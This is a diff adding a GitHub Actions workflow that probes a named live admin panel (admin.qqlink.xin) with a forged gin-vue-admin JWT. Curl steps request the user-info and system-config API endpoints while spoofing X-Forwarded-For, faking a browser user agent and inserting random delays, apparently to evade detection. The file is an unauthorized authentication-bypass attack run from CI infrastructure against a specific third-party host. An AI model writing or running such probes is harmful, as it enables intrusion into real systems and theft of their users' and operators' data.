@@ -1,0 +1,26 @@
+name: gva-probe
+on:
+  workflow_dispatch:
+    inputs:
+      token:
+        description: 'forged GVA JWT (x-token)'
+        required: true
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe-admin-xin
+        run: |
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
+          echo "runner_ip: $(curl -sk --max-time 15 https://api.ipify.org || echo unknown)"
+          echo "=== 1. GET / (no auth) ==="
+          curl -sk --max-time 25 -A "$UA" -D - -o /dev/null "https://admin.qqlink.xin/" | head -c 600
+          echo
+          sleep $((RANDOM % 8 + 8))
+          echo "=== 2. GET /api/user/getUserInfo (JWT+XFF) ==="
+          curl -sk --max-time 25 -A "$UA" -H "x-token: ${{ github.event.inputs.token }}" -H "X-Forwarded-For: 110.87.83.82" -w '\n[HTTP:%{http_code} len:%{size_download}]\n' "https://admin.qqlink.xin/api/user/getUserInfo" | head -c 1500
+          echo
+          sleep $((RANDOM % 8 + 8))
+          echo "=== 3. GET /api/system/getSystemConfig (JWT+XFF) ==="
+          curl -sk --max-time 25 -A "$UA" -H "x-token: ${{ github.event.inputs.token }}" -H "X-Forwarded-For: 110.87.83.82" -w '\n[HTTP:%{http_code} len:%{size_download}]\n' "https://admin.qqlink.xin/api/system/getSystemConfig" | head -c 900
